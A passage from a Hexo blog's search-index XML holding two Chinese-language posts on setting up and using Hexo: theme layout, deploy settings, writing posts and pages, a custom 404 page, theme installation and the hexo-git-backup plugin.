class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── languages            #多语言</span><br><span class="line">|   ├── default.yml      #默认语言</span><br><span class="line">|   └── zh-CN.yml        #中文语言</span><br><span class="line">├── layout               #布局，根目录下的*.ejs文件是对主页，分页，存档等的控制</span><br><span class="line">|   ├── _partial         #局部的布局，此目录下的*.ejs是对头尾等局部的控制</span><br><span class="line">|   └── _widget          #小挂件的布局，页面下方小挂件的控制</span><br><span class="line">├── source               #源码</span><br><span class="line">|   ├── css              #css源码 </span><br><span class="line">|   |   ├── _base        #*.styl基础css</span><br><span class="line">|   |   ├── _partial     #*.styl局部css</span><br><span class="line">|   |   ├── fonts        #字体</span><br><span class="line">|   |   ├── images       #图片</span><br><span class="line">|   |   └── style.styl   #*.styl引入需要的css源码</span><br><span class="line">|   ├── fancybox         #fancybox效果源码</span><br><span class="line">|   └── js               #javascript源代码</span><br><span class="line">├── _config.yml          #主题配置文件</span><br><span class="line">└── README.md            #用GitHub的都知道</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/luuman/luuman.github.io/master/resoures/iPhone6-mockup.jpg" title="iPhone6" class="gallery-item"><img src="https://raw.githubusercontent.com/luuman/luuman.github.io/master/resoures/iPhone6-mockup.jpg" alt="iPhone6"></a></p><h2 id="关于Hexo迁移"><a href="#关于Hexo迁移" class="headerlink" title="关于Hexo迁移"></a>关于Hexo迁移</h2><p>最近，Waterstrong提交了一版，这版本可以将hexo布置在GitHub其下的其他项目，比如Blog等。但是还是有些东西需要修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: http:&#x2F;&#x2F;luuman.github.io&#x2F;Blog&#x2F;</span><br><span class="line">root: &#x2F;Blog&#x2F;</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line">上传是需要出入密码</span><br><span class="line"></span><br><span class="line"># Deployment 站点部署到github要配置，上一节中已经讲过</span><br><span class="line">## Docs: http:&#x2F;&#x2F;zespia.tw&#x2F;hexo&#x2F;docs&#x2F;deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  #repository: git@github.com:luuman&#x2F;Blog.git</span><br><span class="line">  repository: https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;Blog.git</span><br><span class="line">  branch: gh-pages</span><br></pre></td></tr></table></figure><p>非常感谢Waterstrong</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的使用介绍</title>
      <link href="Hexo-use-Introduction.html"/>
      <url>Hexo-use-Introduction.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>　　<strong>自用笔记：</strong>本文属于自用笔记，不做详解，仅供参考。在此记录自己已理解并开始遵循的前端代码规范。What How Why<br>　　最近，使用Hexo遇到了很多问题，在设立进行整理。</p><h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n #写文章 </span><br><span class="line"></span><br><span class="line">    其中my new post为文章标题，执行命令后。</span><br><span class="line">    会在项目\source_posts中生成my new post.md文件，用编辑器打开编写即可。</span><br><span class="line"></span><br><span class="line">    当然，也可以直接在\source_posts中新建一个md文件，我就是这么做的。</span><br><span class="line"></span><br><span class="line">    文章开头语法：</span><br><span class="line"></span><br><span class="line">title: name #文章标题</span><br><span class="line">date: 2015-12-25 18:29:00  #写作时间</span><br><span class="line">description: #文章描述</span><br><span class="line">categories: #文章分类</span><br><span class="line">- 建站</span><br><span class="line">tags: #文章标签</span><br><span class="line">- 博客</span><br><span class="line">- 建站</span><br><span class="line">- Hexo</span><br><span class="line">toc: true # 生成目录</span><br><span class="line">author:</span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: #指定链接</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">    以上是摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">    以下是余下全文</span><br></pre></td></tr></table></figure><h3 id="写多种文章"><a href="#写多种文章" class="headerlink" title="写多种文章"></a>写多种文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &quot;postName&quot; #新建文章</span><br><span class="line"></span><br><span class="line">    [layout]：其中layout是可选参数，默认值为post。</span><br><span class="line">    有哪些layout呢，请到 scaffolds 目录下查看，这些文件名称就是layout名称。</span><br><span class="line">    当然你可以添加自己的layout，方法就是添加一个文件即可。</span><br><span class="line">    同时你也可以编辑现有的layout，比如post的layout默认是 hexo\scaffolds\post.md</span><br><span class="line"></span><br><span class="line">    关于hexo\scaffolds\photo.md配置文件的介绍：</span><br><span class="line"></span><br><span class="line">layout: &#123; &#123; layout &#125; &#125; #layout名称</span><br><span class="line">title: &#123; &#123; title &#125; &#125; #文章标题</span><br><span class="line">date: &#123; &#123; date &#125; &#125; #文章生成时间</span><br><span class="line">ategories: #文章分类目录</span><br><span class="line">tags:  #文章标签</span><br><span class="line">-  #</span><br><span class="line">photos:  #</span><br><span class="line">-  #</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">layout: photo</span><br><span class="line">title: 我的阅历</span><br><span class="line">date: 2085-01-16 07:33:44</span><br><span class="line">tags: [hexo]</span><br><span class="line">photos:</span><br><span class="line">- http:&#x2F;&#x2F;bruce.u.qiniudn.com&#x2F;2013&#x2F;11&#x2F;27&#x2F;reading&#x2F;photos-0.jpg</span><br><span class="line">- http:&#x2F;&#x2F;bruce.u.qiniudn.com&#x2F;2013&#x2F;11&#x2F;27&#x2F;reading&#x2F;photos-1.jpg</span><br></pre></td></tr></table></figure><h3 id="自定义页面"><a href="#自定义页面" class="headerlink" title="自定义页面"></a>自定义页面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    执行new page命令</span><br><span class="line"></span><br><span class="line">$ hexo new page &quot;about&quot;</span><br><span class="line"></span><br><span class="line">    在 *hexo\source\* 下会生成 *about* 目录，</span><br><span class="line">    里面有个index.md，直接编辑就可以了，</span><br><span class="line">    然后在主题的 *_config.yml* 中将其配置显示出来。 </span><br><span class="line"></span><br><span class="line">    上述步骤，也可以手工生成，在 *hexo\source\* 下手工新建</span><br><span class="line">     *about* 和 *index.md* 也是完全等价的。</span><br><span class="line"></span><br><span class="line">    因为markdown对table的支持不好，我是在about中直接</span><br><span class="line">    建立index.html，里面书写页面内容，hexo会帮你加上头和尾。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="写页面（404）"><a href="#写页面（404）" class="headerlink" title="写页面（404）"></a>写页面（404）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page &quot;404&quot;</span><br><span class="line"></span><br><span class="line">UUhike@UUhike-pc MINGW64 &#x2F;d&#x2F;Hexo&#x2F;Hexo (master)</span><br><span class="line">$ hexo new page &quot;404&quot;</span><br><span class="line">INFO  Created: D:\Hexo\Hexo\source\404\index-1.md</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">title: 404 Not Found：该页无法显示</span><br><span class="line">comments: false</span><br><span class="line">permalink: &#x2F;404</span><br><span class="line">fancybox: false</span><br><span class="line">---</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">    .article-title &#123;</span><br><span class="line">        font-size: 2.1em;</span><br><span class="line">    &#125;</span><br><span class="line">    strong a &#123;</span><br><span class="line">        color: #747474;</span><br><span class="line">    &#125;</span><br><span class="line">    .share &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .player &#123;</span><br><span class="line">        margin-left: -10px;</span><br><span class="line">    &#125;</span><br><span class="line">    .sign &#123;</span><br><span class="line">        text-align: right;</span><br><span class="line">        font-style: italic;</span><br><span class="line">    &#125;</span><br><span class="line">    #page-visit &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .center &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        height: 2.5em;</span><br><span class="line">        font-weight: bold;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2 &#123;</span><br><span class="line">        height: 2.2em;</span><br><span class="line">        font-size: 1em;</span><br><span class="line">        width: 50%;</span><br><span class="line">        margin: auto 24%;</span><br><span class="line">        color: #727272;</span><br><span class="line">        opacity: .6;</span><br><span class="line">        border: 2px solid lightgray;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2:hover &#123;</span><br><span class="line">        opacity: 1;</span><br><span class="line">        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)</span><br><span class="line">        &#125;;</span><br><span class="line">    .article-entry hr &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic br &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;pic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&#x2F;resources&#x2F;Mihawk-Wind.gif&quot; title&#x3D;&quot;Mihawk-Wind&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;很抱歉，您所访问的地址并不存在: &lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;&#x2F;&quot;&gt;回主页&lt;&#x2F;a&gt; · &lt;a href&#x3D;&quot;&#x2F;archives&quot;&gt;所有文章&lt;&#x2F;a&gt; · &lt;a href&#x3D;&quot;&#x2F;about&quot;&gt;留言板&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;可在边栏搜索框中对本站进行检索，以获取相关信息。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;text-align: center&quot;&gt;</span><br><span class="line">以下是博主喜欢的一些歌曲，可以听听，稍作休息~</span><br><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;320 height&#x3D;330 src&#x3D;&quot;http:&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;0&amp;id&#x3D;112513213&amp;auto&#x3D;0&amp;height&#x3D;430&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="发布博客内容"><a href="#发布博客内容" class="headerlink" title="发布博客内容"></a>发布博客内容</h3><p>实现发布，前提是配置好，部署到Github前需要配置_config.yml文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: github</span><br><span class="line">  repository: git@github.com:zhchnchn&#x2F;zhchnchn.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更新的最新版本，可能会有Bug，自行百度，好像要修改type：git。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server #开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）Hexo 会监视文件变动并自动更新，您无须重启服务器。</span><br><span class="line"></span><br><span class="line">$ hexo g #生成</span><br><span class="line">$ hexo generate #生成静态页面至public目录（最终上传这个文件到GitHub）</span><br><span class="line"></span><br><span class="line">$ hexo d &#x3D;&#x3D; hexo deploy#部署</span><br><span class="line">$ hexo d #部署 # 可与hexo g合并为 hexo d -g</span><br><span class="line"></span><br><span class="line">$ hexo deploy -g</span><br><span class="line">$ hexo server -g # 生成默认文件群再执行,开启本地静态html服务器</span><br></pre></td></tr></table></figure><h3 id="主题的更改"><a href="#主题的更改" class="headerlink" title="主题的更改"></a>主题的更改</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. 将Git Shell 切到&#x2F;D&#x2F;Hexo目录下，然后执行下面的命令，将pacman下载到 themes&#x2F;pacman 目录下。</span><br><span class="line"></span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;A-limon&#x2F;pacman.git themes&#x2F;pacman</span><br><span class="line">2. 修改你的博客根目录&#x2F;D&#x2F;Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。</span><br><span class="line"></span><br><span class="line">3. 更新pacman主题</span><br><span class="line"></span><br><span class="line">$ cd themes&#x2F;pacman</span><br><span class="line">$ git pull</span><br><span class="line"></span><br><span class="line">NOTE：先备份_config.yml 文件后再升级</span><br><span class="line"></span><br><span class="line">主题：</span><br><span class="line">    yilia</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;litten&#x2F;hexo-theme-yilia.git themes&#x2F;yilia</span><br><span class="line">    modernist</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;heroicyang&#x2F;hexo-theme-modernist.git themes&#x2F;modernist</span><br><span class="line">    jacman</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;cnfeat&#x2F;cnfeat.git themes&#x2F;jacman</span><br></pre></td></tr></table></figure><h3 id="文章图片路径"><a href="#文章图片路径" class="headerlink" title="文章图片路径"></a>文章图片路径</h3><p>Hexo如何方式图片，图片应该放置到哪里，不会应为上传而覆盖掉。然后把文章里的index.md删除，将文件存放在resource文件夹中间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    发布页面</span><br><span class="line">$ hexo new page &quot;name&quot; # 新建一个页面，页面名称name</span><br><span class="line"></span><br><span class="line">    UUhike@UUhike-pc MINGW64 &#x2F;d&#x2F;Hexo&#x2F;Hexo (master)</span><br><span class="line">$ hexo new page &quot;resoures&quot;</span><br><span class="line">    INFO  Created: D:\Hexo\Hexo\source\resoures\index.md</span><br></pre></td></tr></table></figure><h3 id="Hexo文件备份"><a href="#Hexo文件备份" class="headerlink" title="Hexo文件备份"></a>Hexo文件备份</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">    git-backup.</span><br><span class="line"></span><br><span class="line">    Install</span><br><span class="line"></span><br><span class="line">    if your hexo version is 2.x.x, you should install as follow:</span><br><span class="line"></span><br><span class="line">$ npm install hexo-git-backup@0.0.91 --save</span><br><span class="line">    if version is 3.x.x, you should install as follow:</span><br><span class="line"></span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">    Update</span><br><span class="line"></span><br><span class="line">    if you install with --save, you must remove firstly when you update it.</span><br><span class="line"></span><br><span class="line">$ npm remove hexo-git-backup</span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">    Configure</span><br><span class="line"></span><br><span class="line">    You should configure this plugin in _config.yml.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Using</span><br><span class="line"></span><br><span class="line">hexo backup </span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">hexo b</span><br><span class="line">Options</span><br><span class="line"></span><br><span class="line">if you want to back up with your theme,just add theme: your theme name,your theme name in _config.yml.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    theme: coney,landscape,xxx</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Attention: if you do as above, the dir themes&#x2F;coney&#x2F;.gitwill be removed</span><br><span class="line"></span><br><span class="line">if you want DIY commit message, just add &#39;message: update xxx&#39;.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    message: update xxx</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Now you can backup all the blog!</span><br><span class="line"></span><br><span class="line">Problems</span><br><span class="line"></span><br><span class="line">You may get some troubles by your computer&#39; permission。</span><br><span class="line"></span><br><span class="line">Error: EISDIR, open</span><br><span class="line"></span><br><span class="line">it is caused by permission. just do &#39;sudo hexo b&#39;</span><br><span class="line"></span><br><span class="line">sudo hexo b</span><br></pre></td></tr></table></figure><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><a href="http://luuman.github.io/2015/12/25/GitHub+Hexo/">使用GitHub搭建Hexo博客</a><br><a href="http://luuman.github.io/2015/12/27/Hexo-plug/">Hexo插件安装</a><br><a href="http://ibruce.info/2013/11/22/hexo-your-blog/">hexo你的博客</a><br><a href="http://www.jianshu.com/p/05289a4bc8b2#">如何搭建一个独立博客——简明Github Pages与Hexo教程</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
